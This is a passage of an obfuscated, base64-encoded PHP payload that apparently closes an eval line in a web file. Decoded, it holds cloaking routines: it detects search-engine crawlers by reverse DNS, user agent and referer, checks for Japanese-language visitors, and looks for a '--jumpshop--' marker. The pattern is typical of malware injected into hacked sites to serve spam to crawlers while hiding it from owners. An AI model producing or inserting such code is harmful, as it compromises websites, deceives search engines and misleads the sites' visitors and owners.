gdHJ5CiAgICB7CiAgICAgICAgJHJkbnMgPSBnZXRob3N0YnlhZGRyKCRpcCk7CiAgICAgICAgaWYoZW1wdHkoJHJkbnMpKSByZXR1cm4gZmFsc2U7CgogICAgICAgIGZvcmVhY2ggKCRib3RfZG5fcG9vbCBhcyAkZG4pCiAgICAgICAgewogICAgICAgIGlmKHN0cmlwb3MoJHJkbnMsJGRuKSkgcmV0dXJuIHRydWU7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgICBjYXRjaChFeGNlcHRpb24gJGUpCiAgICB7CiAgICAgICAgcmV0dXJuIChzdHJpcG9zKCR1YSwiYm90IikKICAgICAgICB8fHN0cmlwb3MoJHVhLCJzcGlkZXIiKQogICAgICAgIHx8c3RyaXBvcygkdWEsInlhaG9vIikKICAgICAgICB8fHN0cmlwb3MoJHVhLCJzZXpuYW0iKQogICAgICAgIHx8c3RyaXBvcygkdWEsIkdvb2dsZWJvdCIpCiAgICAgICAgfHxzdHJpcG9zKCR1YSwiYmluZ2JvdCIpCiAgICAgICAgfHxzdHJpcG9zKCR1YSwibXNuYm90IikKICAgICAgICB8fHN0cmlwb3MoJHVhLCJZYWhvbyEgU2x1cnAiKQogICAgICAgIHx8c3RyaXBvcygkdWEsIlNsdXJwIikKICAgICAgICB8fHN0cmlwb3MoJHVhLCJiaW5nIikpOwogICAgfQp9CgpmdW5jdGlvbiBpc19qcF9sYW5nKCkKewogICAgaWYoc3RyaXBvcyhnZXRfdXNlcl9hZ2VudCgpLCAnLS1qdW1wc2hvcC0tJykgPT09IDApewogICAgICAgIHJldHVybiB0cnVlOwogICAgfQogICAgaWYgKGlzc2V0KCRfU0VSVkVSWydIVFRQX0FDQ0VQVF9MQU5HVUFHRSddKSkgewogICAgICAgICRsYW5nID0gc3Vic3RyKCRfU0VSVkVSWydIVFRQX0FDQ0VQVF9MQU5HVUFHRSddLCAwLCA0KTsKICAgIH1lbHNlewogICAgICAgICRsYW5nID0gJyc7CiAgICB9CgogICAgcmV0dXJuIHN0cmlwb3MoJGxhbmcsImphIikgPT09IDA7Cgp9CgoKZnVuY3Rpb24gaXNfZnJvbV9ib3QoKQp7CiAgICBpZihzdHJpcG9zKGdldF91c2VyX2FnZW50KCksICctLWp1bXBzaG9wLS0nKSA9PT0gMCl7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgaWYgKCFpc3NldCgkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10pKSB7CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogICAgJHJlZmVyZXIgPSAkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ107CiAgICByZXR1cm4gKHN0cmlwb3MoJHJlZmVyZXIsImJvdCIpCiAgICAgICAgfHxzdHJpcG9zKCRyZWZlcmVyLCJzcGlkZXIiKQogICAgICAgIHx8c3RyaXBvcygkcmVmZXJlciwieWFob28iKQogICAgICAgIHx8c3RyaXBvcygkcmVmZXJlciwic2V6bmFtIikKICAgICAgICB8fHN0cmlwb3MoJHJlZmVyZXIsIkdvb2dsZWJvdCIpCiAgICAgICAgfHxzdHJpcG9zKCRyZWZlcmVyLCJiaW5nYm90IikKICAgICAgICB8fHN0cmlwb3MoJHJlZmVyZXIsIm1zbmJvdCIpCiAgICAgICAgfHxzdHJpcG9zKCRyZWZlcmVyLCJZYWhvbyEgU2x1cnAiKQogICAgICAgIHx8c3RyaXBvcygkcmVmZXJlciwiU2x1cnAiKQogICAgICAgIHx8c3RyaXBvcygkcmVmZXJlciwiYmluZyIpKTsKfQoKPz4=");?>